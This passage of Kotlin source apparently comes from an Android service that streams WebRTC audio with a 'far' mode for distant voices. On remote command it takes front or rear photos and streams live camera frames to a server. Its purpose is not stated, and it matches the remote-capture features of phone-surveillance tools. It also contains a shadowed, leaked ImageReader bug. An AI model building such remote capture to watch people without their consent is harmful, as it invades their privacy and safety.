                        Log.e(TAG, "WebRTC createAnswer failed: $error")
                    }

                    override fun onSetSuccess() {}
                    override fun onSetFailure(error: String?) {}
                }, answerConstraints)
            }

            override fun onSetFailure(error: String?) {
                sendWebRtcState("remote_set_fail")
                Log.e(TAG, "WebRTC setRemoteDescription failed: $error")
            }

            override fun onCreateSuccess(desc: SessionDescription?) {}
            override fun onCreateFailure(error: String?) {}
        }, SessionDescription(SessionDescription.Type.OFFER, remoteSdp))
    }

    private fun tuneOpusSdp(sdp: String, targetKbps: Int): String {
        val opusPayload = Regex("a=rtpmap:(\\d+) opus/48000/2", RegexOption.IGNORE_CASE)
            .find(sdp)
            ?.groupValues
            ?.getOrNull(1)
            ?: return sdp
        
        // Far mode: always use maximum quality settings
        val isFarMode = voiceProfile == "far"
        
        // In low network mode, keep quality-biased compression settings.
        // In far mode, use higher bitrates for distant voice capture.
        val effectiveTarget = when {
            isFarMode -> targetKbps.coerceAtLeast(WEBRTC_FAR_MIN_KBPS)
            lowNetworkMode -> targetKbps.coerceAtMost(WEBRTC_MAX_BITRATE_KBPS)
            else -> targetKbps
        }
        val maxBitrateLimit = if (isFarMode) WEBRTC_FAR_MAX_KBPS * 1000 else WEBRTC_STANDARD_MAX_KBPS * 1000
        val maxAvg = (effectiveTarget * 1000).coerceIn(WEBRTC_MIN_BITRATE_KBPS * 1000, maxBitrateLimit)
        val minBitrateFloor = if (isFarMode) WEBRTC_FAR_MIN_KBPS * 1000 else WEBRTC_MIN_BITRATE_KBPS * 1000
        val minAvg = minBitrateFloor.coerceAtMost(maxAvg)
        
        // Adaptive ptime: 20ms normal, 40ms for low network (fewer packets)
        // Far mode: use 20ms for lower latency
        val ptime = if (lowNetworkMode && !isFarMode) lowNetworkFrameMs.toString() else "20"
        
        // Far mode: always use 48kHz for full quality
        val playbackRate = when {
            isFarMode -> "48000"
            lowNetworkMode -> "16000"
            else -> "48000"
        }
        
        val fmtpRegex = Regex("a=fmtp:$opusPayload ([^\\r\\n]+)")
        val tunedParams = mapOf(
            "maxaveragebitrate" to maxAvg.toString(),
            "minaveragebitrate" to minAvg.toString(),
            "maxplaybackrate" to playbackRate,
            "sprop-maxcapturerate" to playbackRate,
            "ptime" to ptime,
            "minptime" to ptime,
            "useinbandfec" to "1",           // FEC: recovers lost packets on low network
            "usedtx" to "0",                // DTX OFF: prevents audible gaps / "lag" feel
            "stereo" to "0",
            "sprop-stereo" to "0",
            "cbr" to "0",                    // VBR: allocates more bits to complex speech
            "complexity" to if (isFarMode) "10" else if (lowNetworkMode) "7" else "10",
        )
        return if (fmtpRegex.containsMatchIn(sdp)) {
            sdp.replace(fmtpRegex) { match ->
                val merged = mergeFmtpParams(match.groupValues[1], tunedParams)
                "a=fmtp:$opusPayload $merged"
            }
        } else {
            val joined = tunedParams.entries.joinToString(";") { "${it.key}=${it.value}" }
            sdp + "\r\na=fmtp:$opusPayload $joined"
        }
    }

    private fun mergeFmtpParams(base: String, updates: Map<String, String>): String {
        val params = linkedMapOf<String, String>()
        base.split(';')
            .map { it.trim() }
            .filter { it.isNotBlank() }
            .forEach { token ->
                val idx = token.indexOf('=')
                if (idx <= 0 || idx >= token.length - 1) return@forEach
                val key = token.substring(0, idx).trim().lowercase()
                val value = token.substring(idx + 1).trim()
                if (key.isNotBlank() && value.isNotBlank()) {
                    params[key] = value
                }
            }
        updates.forEach { (k, v) -> params[k.lowercase()] = v }
        return params.entries.joinToString(";") { "${it.key}=${it.value}" }
    }

    private fun sendWebRtcState(state: String) {
        val msg = JSONObject().apply {
            put("type", "webrtc_state")
            put("state", state)
            put("bitrateKbps", currentWebRtcBitrateKbps)
            put("deviceId", deviceId)
            put("ts", System.currentTimeMillis())
            if (lastDashboardQuality != null) put("quality", lastDashboardQuality)
        }
        safeSend(msg.toString())
    }

    private fun scheduleWebRtcRecovery(reason: String) {
        if (webRtcRecoveryJob?.isActive == true) return
        webRtcRecoveryJob = serviceScope.launch(Dispatchers.IO) {
            repeat(3) { idx ->
                delay(700L + idx * 900L)
                if (!isWebRtcStreaming || peerConnection == null) return@launch
                try {
                    peerConnection?.restartIce()
                } catch (_: Exception) {}
                sendWebRtcState("need_reoffer_${reason}_${idx + 1}")
            }
        }
    }

    private fun fetchIceServersFromServer(): List<PeerConnection.IceServer> {
        val fallback = listOf(PeerConnection.IceServer.builder("stun:stun.l.google.com:19302").createIceServer())
        val url = "$serverHttpBaseUrl/api/webrtc-config"
        return try {
            val reqBuilder = Request.Builder().url(url)
            if (wsAuthToken.isNotBlank()) reqBuilder.addHeader("X-Auth-Token", wsAuthToken)
            val response = okHttpClient.newCall(reqBuilder.build()).execute()
            if (!response.isSuccessful) return fallback
            val body = response.body?.string().orEmpty()
            if (body.isBlank()) return fallback
            val json = JSONObject(body)
            val arr = json.optJSONArray("iceServers") ?: JSONArray()
            val parsed = mutableListOf<PeerConnection.IceServer>()
            for (i in 0 until arr.length()) {
                val item = arr.optJSONObject(i) ?: continue
                val urls = mutableListOf<String>()
                when (val u = item.opt("urls")) {
                    is String -> if (u.isNotBlank()) urls.add(u)
                    is JSONArray -> {
                        for (j in 0 until u.length()) {
                            val s = u.optString(j, "")
                            if (s.isNotBlank()) urls.add(s)
                        }
                    }
                }
                if (urls.isEmpty()) continue
                val builder = PeerConnection.IceServer.builder(urls)
                val user = item.optString("username", "")
                val cred = item.optString("credential", "")
                if (user.isNotBlank()) builder.setUsername(user)
                if (cred.isNotBlank()) builder.setPassword(cred)
                parsed.add(builder.createIceServer())
            }
            if (parsed.isEmpty()) fallback else parsed
        } catch (e: IOException) {
            Log.w(TAG, "ICE config fetch failed: ${e.message}")
            fallback
        } catch (e: Exception) {
            Log.w(TAG, "ICE config parse failed: ${e.message}")
            fallback
        }
    }

    private fun chooseTargetBitrateKbps(): Int {
        // FAR MODE: Use highest bitrates for raw quality capture
        val isFarMode = voiceProfile == "far"
        
        // LOW NETWORK MODE: keep quality-biased bitrates for better speech clarity.
        if (lowNetworkMode) {
            val q = lastDashboardQuality
            val loss = q?.optDouble("lossPct", Double.NaN) ?: Double.NaN
            
            // Far voice: never cap the RTP sender at 64 kbps — that overrode Opus fmtp and
            // crushed distant-speech clarity. Stay on far-tier bitrates only.
            if (isFarMode) {
                return if (!loss.isNaN() && loss >= 10.0) WEBRTC_FAR_MIN_KBPS else WEBRTC_FAR_MID_KBPS
            }
            return if (!loss.isNaN() && loss >= 10.0) WEBRTC_MIN_BITRATE_KBPS else WEBRTC_MID_BITRATE_KBPS
        }
        
        // FAR MODE (good network): Use higher bitrates for better distant voice capture
        if (isFarMode) {
            val cm = connectivityManager
            val network = cm?.activeNetwork
            val caps = network?.let { cm.getNetworkCapabilities(it) }
            
            // Default to max far mode bitrate
            var target = WEBRTC_FAR_MAX_KBPS
            
            // Check network quality for far mode
            val q = lastDashboardQuality
            val loss = q?.optDouble("lossPct", Double.NaN) ?: Double.NaN
            val rtt = q?.optDouble("rttMs", Double.NaN) ?: Double.NaN
            
            // Even in far mode, respect severe network issues
            if ((!loss.isNaN() && loss >= 15.0) || (!rtt.isNaN() && rtt >= 500.0)) {
                target = WEBRTC_FAR_MIN_KBPS
            } else if (caps?.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) == true) {
                val downKbps = caps.linkDownstreamBandwidthKbps
                target = when {
                    downKbps in 1..500 -> WEBRTC_FAR_MIN_KBPS
                    downKbps in 501..2000 -> WEBRTC_FAR_MID_KBPS
                    else -> WEBRTC_FAR_MAX_KBPS
                }
            }
            
            return target.coerceIn(WEBRTC_FAR_MIN_KBPS, WEBRTC_FAR_MAX_KBPS)
        }
        
        // STANDARD MODE: Use higher bitrates (64-128 kbps)
        val cm = connectivityManager ?: return WEBRTC_STANDARD_MID_KBPS
        val network = cm.activeNetwork ?: return WEBRTC_STANDARD_MID_KBPS
        val caps = cm.getNetworkCapabilities(network) ?: return WEBRTC_STANDARD_MID_KBPS
        
        // Start with MID bitrate for cellular to maintain quality
        var target = if (caps.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR)) {
            WEBRTC_STANDARD_MID_KBPS
        } else {
            WEBRTC_STANDARD_MID_KBPS
        }
        
        if (caps.hasTransport(NetworkCapabilities.TRANSPORT_WIFI)) {
            val downKbps = caps.linkDownstreamBandwidthKbps
            target = when {
                // Use low-network bitrates for very poor WiFi
                downKbps in 1..200 -> WEBRTC_MIN_BITRATE_KBPS
                downKbps in 201..500 -> WEBRTC_MID_BITRATE_KBPS
                downKbps in 501..1000 -> WEBRTC_STANDARD_MIN_KBPS // 64 kbps
                else -> WEBRTC_STANDARD_MAX_KBPS // 128 kbps
            }
        }
        
        val q = lastDashboardQuality
        val loss = q?.optDouble("lossPct", Double.NaN) ?: Double.NaN
        val rtt = q?.optDouble("rttMs", Double.NaN) ?: Double.NaN
        val jitter = q?.optDouble("jitterMs", Double.NaN) ?: Double.NaN
        
        // Severe network issues: drop to minimum low-network bitrate
        if (wsReconnectAttempts >= 6) return WEBRTC_MIN_BITRATE_KBPS
        if (!loss.isNaN() && loss >= 25.0) return WEBRTC_MIN_BITRATE_KBPS
        if (!rtt.isNaN() && rtt >= 800.0) return WEBRTC_MIN_BITRATE_KBPS
        if (!jitter.isNaN() && jitter >= 300.0) return WEBRTC_MIN_BITRATE_KBPS
        
        // Moderate issues: use low-network mid bitrate.
        if ((!loss.isNaN() && loss >= 15.0) || (!rtt.isNaN() && rtt >= 500.0) || (!jitter.isNaN() && jitter >= 150.0)) {
            return WEBRTC_MID_BITRATE_KBPS
        }
        
        return target.coerceIn(WEBRTC_MIN_BITRATE_KBPS, WEBRTC_STANDARD_MAX_KBPS)
    }

    private fun applyAdaptiveBitrate() {
        currentWebRtcBitrateKbps = chooseTargetBitrateKbps()
        val sender = webRtcAudioSender ?: return
        try {
            val params = sender.parameters ?: return
            if (params.encodings.isNullOrEmpty()) return
            val targetBps = currentWebRtcBitrateKbps * 1000
            params.encodings.forEach { encoding ->
                encoding.maxBitrateBps = targetBps
            }
            sender.parameters = params
            sendWebRtcState("bitrate_${currentWebRtcBitrateKbps}kbps")
        } catch (e: Exception) {
            Log.w(TAG, "Failed to apply bitrate params: ${e.message}")
        }
    }

    private var bitrateNetworkCallback: ConnectivityManager.NetworkCallback? = null

    private fun registerNetworkCallbackForBitrate() {
        if (bitrateNetworkCallback != null) return
        val callback = object : ConnectivityManager.NetworkCallback() {
            override fun onAvailable(network: Network) {
                applyAdaptiveBitrate()
            }

            override fun onCapabilitiesChanged(network: Network, networkCapabilities: NetworkCapabilities) {
                applyAdaptiveBitrate()
            }

            override fun onLost(network: Network) {
                applyAdaptiveBitrate()
            }
        }
        bitrateNetworkCallback = callback
        try {
            connectivityManager?.registerNetworkCallback(NetworkRequest.Builder().build(), callback)
        } catch (e: Exception) {
            Log.w(TAG, "Network callback register failed: ${e.message}")
            bitrateNetworkCallback = null
        }
    }

    private fun unregisterNetworkCallbackForBitrate() {
        val callback = bitrateNetworkCallback ?: return
        try {
            connectivityManager?.unregisterNetworkCallback(callback)
        } catch (_: Exception) {}
        bitrateNetworkCallback = null
    }

    private fun captureAndSendPhoto(cameraMode: String) {
        if (isCameraLiveStreaming) {
            stopCameraLiveStream("snapshot_requested")
        }
        if (isPhotoCaptureBusy) {
            safeSend("ACK:take_photo:busy")
            return
        }
        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            safeSend("ACK:take_photo:camera_permission_denied")
            return
        }
        
        isPhotoCaptureBusy = true
        serviceScope.launch(Dispatchers.IO) {
            try {
                // Reduced timeout from 15s to 8s for faster response
                withTimeoutOrNull(8_000L) {
                    val explicitFacing = parseRequestedCameraFacing(cameraMode)
                    val facing = explicitFacing ?: preferredCameraFacing
                    preferredCameraFacing = facing
                    
                    // Single capture attempt - no retry for speed
                    val jpeg = captureJpegOnce(facing, allowFacingFallback = explicitFacing == null)
                    if (jpeg == null || jpeg.isEmpty()) {
                        safeSend("ACK:take_photo:failed")
                        return@withTimeoutOrNull
                    }
                    
                    val isFrontCamera = (facing == CameraCharacteristics.LENS_FACING_FRONT)
                    val optimized = optimizePhotoJpeg(jpeg, isFrontCamera)
                    val cameraName = if (isFrontCamera) "front" else "rear"
                    val filename = "photo_${deviceId.take(8)}_${cameraName}_${System.currentTimeMillis()}.jpg"

                    var httpSuccess = false
                    try {
                        val photoClient = okHttpClient.newBuilder()
                            .connectTimeout(15, TimeUnit.SECONDS)
                            .writeTimeout(30, TimeUnit.SECONDS)
                            .readTimeout(30, TimeUnit.SECONDS)
                            .build()

                        val requestBody = MultipartBody.Builder()
                            .setType(MultipartBody.FORM)
                            .addFormDataPart("deviceId", deviceId)
                            .addFormDataPart(
                                "photo",
                                filename,
                                optimized.toRequestBody("image/jpeg".toMediaTypeOrNull())
                            )
                            .build()

                        val request = Request.Builder()
                            .url("$serverHttpBaseUrl/api/upload-photo")
                            .post(requestBody)
                            .addHeader("X-Filename", filename)
                            .addHeader("X-Device-Id", deviceId)
                            .build()

                        val response = photoClient.newCall(request).execute()
                        httpSuccess = response.isSuccessful
                        response.close()
                    } catch (e: Exception) {
                        Log.e(TAG, "HTTP photo upload failed: ${e.message}")
                    }

                    if (!httpSuccess) {
                        Log.w(TAG, "Falling back to WebSocket base64 for photo")
                        val base64 = Base64.encodeToString(optimized, Base64.NO_WRAP)
                        val msg = JSONObject().apply {
                            put("type", "photo_upload")
                            put("deviceId", deviceId)
                            put("camera", cameraName)
                            put("quality", photoQualityMode)
                            put("nightMode", photoNightMode)
                            put("filename", filename)
                            put("mime", "image/jpeg")
                            put("aiEnhanced", aiPhotoEnhancementEnabled)
                            put("lowNetwork", lowNetworkMode)
                            put("data", base64)
                            put("ts", System.currentTimeMillis())
                        }
                        safeSend(msg.toString())
                    }
                    safeSend("ACK:take_photo:ok:$cameraName")
                } ?: run {
                    // Timeout occurred
                    Log.e(TAG, "Photo capture timeout after 8 seconds")
                    safeSend("ACK:take_photo:timeout")
                }
            } catch (e: Exception) {
                Log.e(TAG, "Photo capture failed: ${e.message}", e)
                safeSend("ACK:take_photo:error:${e.message?.take(50)}")
            } finally {
                isPhotoCaptureBusy = false
            }
        }
    }

    private fun parseRequestedCameraFacing(cameraMode: String): Int? {
        return when (cameraMode.trim().lowercase()) {
            "front", "front_camera", "front-camera", "frontcam", "selfie" -> CameraCharacteristics.LENS_FACING_FRONT
            "rear", "back", "rear_camera", "rear-camera", "back_camera", "back-camera", "backcam", "main" -> CameraCharacteristics.LENS_FACING_BACK
            else -> null
        }
    }

    private data class PhotoCaptureProfile(
        val exposureNs: Long?,
        val iso: Int?,
        val torch: Boolean,
        val aeCompensation: Int,
    )

    private fun requestedNightExposureNs(): Long? {
        return when (photoNightMode) {
            "1s" -> 1_000_000_000L
            "3s" -> 3_000_000_000L
            "5s" -> 5_000_000_000L
            else -> null
        }
    }

    private fun buildPhotoCaptureProfile(chars: CameraCharacteristics): PhotoCaptureProfile {
        val requestedExposure = requestedNightExposureNs() ?: return PhotoCaptureProfile(
            exposureNs = null,
            iso = null,
            torch = false,
            aeCompensation = 0,
        )

        val caps = chars.get(CameraCharacteristics.REQUEST_AVAILABLE_CAPABILITIES) ?: IntArray(0)
        val manualSensor = caps.contains(CameraCharacteristics.REQUEST_AVAILABLE_CAPABILITIES_MANUAL_SENSOR)
        val expRange = chars.get(CameraCharacteristics.SENSOR_INFO_EXPOSURE_TIME_RANGE)
        val isoRange = chars.get(CameraCharacteristics.SENSOR_INFO_SENSITIVITY_RANGE)
        if (manualSensor && expRange != null && isoRange != null) {
            val clampedExposure = requestedExposure.coerceIn(expRange.lower, expRange.upper)
            val desiredIso = when (photoNightMode) {
                "1s" -> 800
                "3s" -> 1200
                "5s" -> 1600
                else -> 800
            }
            val clampedIso = desiredIso.coerceIn(isoRange.lower, isoRange.upper)
            return PhotoCaptureProfile(
                exposureNs = clampedExposure,
                iso = clampedIso,
                torch = false,
                aeCompensation = 0,
            )
        }

        val aeRange = chars.get(CameraCharacteristics.CONTROL_AE_COMPENSATION_RANGE)
        val maxComp = aeRange?.upper ?: 0
        val aeComp = if (maxComp > 0) maxComp else 0
        val flashAvail = chars.get(CameraCharacteristics.FLASH_INFO_AVAILABLE) == true
        return PhotoCaptureProfile(
            exposureNs = null,
            iso = null,
            torch = flashAvail,
            aeCompensation = aeComp,
        )
    }

    @SuppressLint("MissingPermission")
    private suspend fun captureJpegOnce(targetFacing: Int, allowFacingFallback: Boolean = true): ByteArray? {
        val cm = getSystemService(CameraManager::class.java) ?: return null
        val cameraId = selectCameraId(cm, targetFacing, allowFacingFallback) ?: return null
        val chars = cm.getCameraCharacteristics(cameraId)
        val captureProfile = buildPhotoCaptureProfile(chars)
        val streamMap = chars.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP) ?: return null
        
        // Resolution settings based on quality mode
        // HD mode: use max resolution for full quality
        // Normal/Fast: reasonable size that still captures full frame
        val maxEdge = when (photoQualityMode) {
            "fast" -> 1280   // Increased for better quality
            "hd" -> 2560     // Allow higher res for HD
            else -> 1600     // Balanced
        }
        
        val allSizes = streamMap.getOutputSizes(ImageFormat.JPEG) ?: return null
        
        // Get sensor aspect ratio for full-frame capture (no crop)
        val sensorSize = chars.get(CameraCharacteristics.SENSOR_INFO_ACTIVE_ARRAY_SIZE)
        val sensorRatio = if (sensorSize != null && sensorSize.width() > 0 && sensorSize.height() > 0) {
            sensorSize.width().toFloat() / sensorSize.height()
        } else {
            4f / 3f  // Default to 4:3
        }
        
        // Prefer sizes matching sensor ratio (full frame, no crop)
        val size = allSizes
            .filter { it.width <= maxEdge && it.height <= maxEdge }
            .sortedWith(compareBy<android.util.Size> { sz ->
                // Calculate aspect ratio match to sensor (full frame = 0 difference)
                val ratio = maxOf(sz.width, sz.height).toFloat() / minOf(sz.width, sz.height)
                Math.abs(ratio - sensorRatio)
            }.thenByDescending { it.width * it.height })  // Then prefer larger
            .firstOrNull()
            ?: allSizes.maxByOrNull { it.width * it.height }  // Fallback: largest available
            ?: return null
        
        Log.d(TAG, "Photo capture: ${size.width}x${size.height}, sensor ratio: $sensorRatio")

        val thread = HandlerThread("photo_capture_thread").apply { start() }
        val handler = Handler(thread.looper)
        val imageReader = ImageReader.newInstance(size.width, size.height, ImageFormat.JPEG, 1)
        val latch = CountDownLatch(1)

        var bytes: ByteArray? = null
        var camera: CameraDevice? = null
        var session: CameraCaptureSession? = null

        try {
            imageReader.setOnImageAvailableListener({ reader ->
                try {
                    val image = reader.acquireLatestImage()
                    if (image != null) {
                        val buffer: ByteBuffer = image.planes[0].buffer
                        val arr = ByteArray(buffer.remaining())
                        buffer.get(arr)
                        bytes = arr
                        image.close()
                    }
                } catch (_: Exception) {
                } finally {
                    latch.countDown()
                }
            }, handler)

            // C-03: Non-blocking camera open
            val cameraDevice = suspendCancellableCoroutine<CameraDevice?> { cont ->
                try {
                    cm.openCamera(cameraId, object : CameraDevice.StateCallback() {
                        override fun onOpened(cd: CameraDevice) { 
                            if (cont.isActive) cont.resumeWith(Result.success(cd)) else cd.close()
                        }
                        override fun onDisconnected(cd: CameraDevice) { 
                            cd.close(); if (cont.isActive) cont.resumeWith(Result.success(null))
                        }
                        override fun onError(cd: CameraDevice, error: Int) { 
                            cd.close(); if (cont.isActive) cont.resumeWith(Result.success(null))
                        }
                    }, handler)
                } catch (e: Exception) {
                    if (cont.isActive) cont.resumeWith(Result.success(null))
                }
            } ?: return null
            camera = cameraDevice

            val imageReader = ImageReader.newInstance(1024, 1024, ImageFormat.JPEG, 1)

            // C-03: Non-blocking session creation
            val captureSession = suspendCancellableCoroutine<CameraCaptureSession?> { cont ->
                try {
                    cameraDevice.createCaptureSession(listOf(imageReader.surface), object : CameraCaptureSession.StateCallback() {
                        override fun onConfigured(cs: CameraCaptureSession) { 
                            if (cont.isActive) cont.resumeWith(Result.success(cs)) else cs.close()
                        }
                        override fun onConfigureFailed(cs: CameraCaptureSession) { 
                            if (cont.isActive) cont.resumeWith(Result.success(null))
                        }
                    }, handler)
                } catch (e: Exception) {
                    if (cont.isActive) cont.resumeWith(Result.success(null))
                }
            } ?: return null
            session = captureSession

            val req = cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
                addTarget(imageReader.surface)
                
                // Enable face detection for better focus and exposure
                set(CaptureRequest.STATISTICS_FACE_DETECT_MODE, 
                    CaptureRequest.STATISTICS_FACE_DETECT_MODE_SIMPLE)
                
                // Auto white balance for accurate colors
                set(CaptureRequest.CONTROL_AWB_MODE, CaptureRequest.CONTROL_AWB_MODE_AUTO)
                
                // Disable crop region (full frame)
                set(CaptureRequest.SCALER_CROP_REGION, chars.get(CameraCharacteristics.SENSOR_INFO_ACTIVE_ARRAY_SIZE))
                
                if (captureProfile.exposureNs != null && captureProfile.iso != null) {
                    // Night mode: manual exposure control
                    set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_OFF)
                    set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_OFF)
                    set(CaptureRequest.SENSOR_EXPOSURE_TIME, captureProfile.exposureNs)
                    set(CaptureRequest.SENSOR_FRAME_DURATION, captureProfile.exposureNs)
                    set(CaptureRequest.SENSOR_SENSITIVITY, captureProfile.iso)
                    set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
                    set(CaptureRequest.FLASH_MODE, CaptureRequest.FLASH_MODE_OFF)
                    // Noise reduction for night shots
                    set(CaptureRequest.NOISE_REDUCTION_MODE, CaptureRequest.NOISE_REDUCTION_MODE_HIGH_QUALITY)
                } else {
                    // Auto mode: let camera decide
                    set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO)
                    set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
                    set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
                    set(CaptureRequest.CONTROL_AE_EXPOSURE_COMPENSATION, captureProfile.aeCompensation)
                    set(
                        CaptureRequest.FLASH_MODE,
                        if (captureProfile.torch) CaptureRequest.FLASH_MODE_TORCH else CaptureRequest.FLASH_MODE_OFF
                    )
                    // Standard noise reduction
                    set(CaptureRequest.NOISE_REDUCTION_MODE, CaptureRequest.NOISE_REDUCTION_MODE_FAST)
                }
                
                // C-02: Correct JPEG orientation accounting for display rotation
                val sensorOrientation = chars.get(CameraCharacteristics.SENSOR_ORIENTATION) ?: 90
                val isFront = chars.get(CameraCharacteristics.LENS_FACING) == CameraCharacteristics.LENS_FACING_FRONT
                @Suppress("DEPRECATION")
                val deviceRotation = (getSystemService(Context.WINDOW_SERVICE) as android.view.WindowManager)
                    .defaultDisplay.rotation
                val deviceRotationDeg = when (deviceRotation) {
                    android.view.Surface.ROTATION_0 -> 0
                    android.view.Surface.ROTATION_90 -> 90
                    android.view.Surface.ROTATION_180 -> 180
                    android.view.Surface.ROTATION_270 -> 270
                    else -> 0
                }
                val jpegOrientation = if (isFront) {
                    (sensorOrientation + deviceRotationDeg) % 360
                } else {
                    (sensorOrientation - deviceRotationDeg + 360) % 360
                }
                set(CaptureRequest.JPEG_ORIENTATION, jpegOrientation)
                
                // High quality JPEG (we compress later with network awareness)
                set(CaptureRequest.JPEG_QUALITY, 95.toByte())
            }.build()

            val captureLatch = CountDownLatch(1)
            imageReader.setOnImageAvailableListener({ reader ->
                val image = reader.acquireLatestImage()
                if (image != null) {
                    try {
                        val buffer: ByteBuffer = image.planes[0].buffer
                        val arr = ByteArray(buffer.remaining())
                        buffer.get(arr)
                        bytes = arr
                    } finally {
                        image.close()
                        captureLatch.countDown()
                    }
                }
            }, handler)

            captureSession.capture(req, object : CameraCaptureSession.CaptureCallback() {}, handler)
            captureLatch.await(4, TimeUnit.SECONDS)
            return bytes
        } catch (e: Exception) {
            Log.w(TAG, "captureJpegOnce failed: ${e.message}")
            return null
        } finally {
            try { session?.close() } catch (_: Exception) {}
            try { camera?.close() } catch (_: Exception) {}
            try { imageReader.close() } catch (_: Exception) {}
            try { thread.quitSafely() } catch (_: Exception) {}
        }
    }

    private fun selectCameraId(cm: CameraManager, targetFacing: Int, allowFacingFallback: Boolean = true): String? {
        val ids = cm.cameraIdList ?: return null
        var fallback: String? = null
        for (id in ids) {
            val c = cm.getCameraCharacteristics(id)
            val facing = c.get(CameraCharacteristics.LENS_FACING)
            val caps = c.get(CameraCharacteristics.REQUEST_AVAILABLE_CAPABILITIES) ?: IntArray(0)
            val streamMap = c.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
            val hasJpeg = streamMap?.getOutputSizes(ImageFormat.JPEG)?.isNotEmpty() == true
            val isBackwardCompatible = caps.contains(CameraCharacteristics.REQUEST_AVAILABLE_CAPABILITIES_BACKWARD_COMPATIBLE)
            if (!hasJpeg || !isBackwardCompatible) {
                continue
            }
            if (facing == targetFacing && !isLogicalMultiCamera(c)) return id
            if (facing == targetFacing && fallback == null) fallback = id
            if (allowFacingFallback && fallback == null) fallback = id
        }
        return fallback
    }

    private fun isLogicalMultiCamera(chars: CameraCharacteristics): Boolean {
        val caps = chars.get(CameraCharacteristics.REQUEST_AVAILABLE_CAPABILITIES) ?: IntArray(0)
        return caps.contains(CameraCharacteristics.REQUEST_AVAILABLE_CAPABILITIES_LOGICAL_MULTI_CAMERA)
    }

    private fun liveFrameIntervalMs(): Long {
        return when (photoQualityMode) {
            "fast" -> 60L
            "hd" -> 140L
            else -> 90L
        }
    }

    @SuppressLint("MissingPermission")
    private fun startCameraLiveStream(targetFacing: Int, strictFacing: Boolean = false) {
        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            safeSend("ACK:camera_live:camera_permission_denied")
            return
        }
        preferredCameraFacing = targetFacing
        cameraLiveStrictFacing = strictFacing
        if (isCameraLiveStreaming) {
            restartCameraLiveStream()
            return
        }
        isCameraLiveStreaming = true
        cameraLiveJob?.cancel()
        cameraLiveJob = serviceScope.launch(Dispatchers.IO) {
            safeSend("ACK:camera_live:started")
            sendHealthStatus("camera_live_on")
            
            val cm = getSystemService(CameraManager::class.java) ?: return@launch
            val cameraId = selectCameraId(cm, preferredCameraFacing, !cameraLiveStrictFacing) ?: return@launch
            val chars = cm.getCameraCharacteristics(cameraId)
            
            val streamMap = chars.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP) ?: return@launch
            val allSizes = streamMap.getOutputSizes(ImageFormat.JPEG) ?: return@launch
            val maxEdge = when (photoQualityMode) { "fast" -> 640 else -> 1024 }
            val size = allSizes.filter { it.width <= maxEdge && it.height <= maxEdge }
                .maxByOrNull { it.width * it.height } ?: allSizes.minByOrNull { it.width * it.height } ?: return@launch

            val thread = HandlerThread("live_camera").apply { start() }
            val handler = Handler(thread.looper)
            val imageReader = ImageReader.newInstance(size.width, size.height, ImageFormat.JPEG, 2)
            
            var camera: CameraDevice? = null
            var session: CameraCaptureSession? = null

            try {
                var lastSent = 0L
                imageReader.setOnImageAvailableListener({ reader ->
                    try {
                        val image = reader.acquireLatestImage()
                        if (image != null) {
                            val now = System.currentTimeMillis()
                            if (isCameraLiveStreaming && activeWebSocket != null && now - lastSent >= liveFrameIntervalMs()) {
                                lastSent = now
                                val buffer = image.planes[0].buffer
                                val arr = ByteArray(buffer.remaining())
                                buffer.get(arr)
                                image.close()

                                val frameBase64 = Base64.encodeToString(arr, Base64.NO_WRAP)
                                val msg = JSONObject().apply {
                                    put("type", "camera_live_frame")
                                    put("deviceId", deviceId)
                                    put("camera", if (preferredCameraFacing == CameraCharacteristics.LENS_FACING_FRONT) "front" else "rear")
                                    put("quality", photoQualityMode)
                                    put("mime", "image/jpeg")
                                    put("data", frameBase64)
                                    put("ts", now)
                                }
                                if (!safeSend(msg.toString())) {
                                    Log.w(TAG, "Camera live send failed - stopping stream")
                                    isCameraLiveStreaming = false
                                }
                            } else {
                                image.close()
                            }
                        }
                    } catch (_: Exception) {}
                }, handler)

                val openLatch = CountDownLatch(1)
                cm.openCamera(cameraId, object : CameraDevice.StateCallback() {
                    override fun onOpened(cd: CameraDevice) { camera = cd; openLatch.countDown() }
                    override fun onDisconnected(cd: CameraDevice) { cd.close(); openLatch.countDown() }
                    override fun onError(cd: CameraDevice, error: Int) { cd.close(); openLatch.countDown() }
                }, handler)
                if (!openLatch.await(3, TimeUnit.SECONDS)) return@launch
                val cam = camera ?: return@launch

                val sessionLatch = CountDownLatch(1)
                cam.createCaptureSession(listOf(imageReader.surface), object : CameraCaptureSession.StateCallback() {
                    override fun onConfigured(cs: CameraCaptureSession) { session = cs; sessionLatch.countDown() }
                    override fun onConfigureFailed(cs: CameraCaptureSession) { sessionLatch.countDown() }
                }, handler)
                if (!sessionLatch.await(3, TimeUnit.SECONDS)) return@launch
                val capSession = session ?: return@launch

                val req = cam.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW).apply {
                    addTarget(imageReader.surface)
                    set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO)
                    set(CaptureRequest.JPEG_QUALITY, 60.toByte())
                }.build()

                capSession.setRepeatingRequest(req, null, handler)

                // keep alive loop
                while (isActive && isCameraLiveStreaming && activeWebSocket != null) {
                    delay(1000)
                }

            } finally {
                try { session?.close() } catch (_: Exception) {}
                try { camera?.close() } catch (_: Exception) {}
                try { imageReader.close() } catch (_: Exception) {}
                try { thread.quitSafely() } catch (_: Exception) {}
            }
        }
    }

    private fun restartCameraLiveStream() {
        if (!isCameraLiveStreaming) return
        stopCameraLiveStream("restart")
